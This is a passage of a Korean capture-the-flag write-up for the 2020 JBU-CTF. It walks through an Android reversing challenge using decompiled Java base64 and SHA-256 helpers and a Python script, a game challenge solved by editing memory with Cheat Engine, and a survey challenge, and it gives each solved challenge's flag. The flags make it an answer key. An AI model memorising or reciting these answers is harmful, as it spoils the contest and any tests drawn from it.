        return new String(Base64.decode(content, 0));
    }

    public static String c(String data) throws Exception {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            md.update(data.getBytes());
            byte[] byteData = md.digest();
            StringBuffer sb = new StringBuffer();
            for (byte b : byteData) {
                sb.append(Integer.toString((b & 255) + 256, 16).substring(1));
            }
            StringBuffer hexString = new StringBuffer();
            for (byte b2 : byteData) {
                String hex = Integer.toHexString(b2 & 255);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            System.out.println("EncBySHA256 Error:" + e.toString());
            return BuildConfig.FLAVOR;
        }
    }
}
```

여기서 g.a() 함수는 base64 인코딩 함수이고 g.b() 함수는 base64 디코딩 함수, g.c() 함수는 SHA-256 함수임을 알 수 있다.

MainActivity에서는 문자열을 출력하기에는 코드패치를 하지 않는 이상 불가능한 것으로 보이며, 그러면 그냥 e.a() 함수의 실행 결과값을 알기만 하면 된다.

e.a() 함수는 다음과 같다.

```java
package com.test.android2;

public class e {
    public static String a(String content) throws Exception {
        return g.b(g.a(g.a(g.b(g.a(g.a(g.b(g.a(g.b(g.a(g.b(g.a(g.a("ilikeasssssssy")))))))))))));
    }
}
```

위 코드의 결과값을 구해보면 WVZkNGNHRXlWbWhqTTA1Nll6Tk9lbU16YXowPQ== 이 나오는데,

문제에서 요구하는 자리의 문자들을 조합하면 된다.

```java
from base64 import b64encode, b64decode

output = b64decode(b64encode(b64encode(b64decode(b64encode(b64encode(b64decode(b64encode(b64decode(b64encode(b64decode(b64encode(b64encode("ilikeasssssssy".encode()))))))))))))).decode()
flag1 = [21, 30, 22, 23, 13, 33, 17]
for i in flag1:
    print(output[i-1], end='')
print('_', end='')
flag2 = [29, 30, 28, 31, 33]
for i in flag2:
    print(output[i-1], end='')
```

`scpCTF{NUllbYT_bUl1Y}`

---

## 켠김에 왕까지 (500) - n1net4il

---

치트엔진으로 프로세스를 attach 시켜서 공격력과 체력의 메모리 값을 높은 값으로 수정하면 된다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2040.png)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2041.png)

`scpCTF{f1na11y_gam3_ov3r}`

# Survey

## JBU-CTF 설문조사 (100) - n1net4il

설문조사를 하면 플래그를 얻을 수 있다 

`scpCTF{Th4nk_y0u_s000_muc4}`
